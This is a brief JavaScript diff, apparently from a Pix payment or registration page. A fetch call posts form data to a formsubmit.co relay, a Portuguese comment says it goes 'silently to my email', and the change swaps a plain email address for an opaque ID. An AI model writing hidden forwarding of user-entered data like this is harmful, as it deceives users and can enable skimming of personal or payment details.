@@ -44,7 +44,7 @@ document.addEventListener('DOMContentLoaded', () => {
       btnSubmit.innerText = 'GERANDO PIX...';
 
       // Envia os dados silenciosamente para o meu email
-      fetch('https://formsubmit.co/ajax/polvocampeonatos@gmail.com', {
+      fetch('https://formsubmit.co/ajax/7273c4b6d882fc97417e635e8cabb685', {
         method: 'POST',
         headers: { 
             'Content-Type': 'application/json',
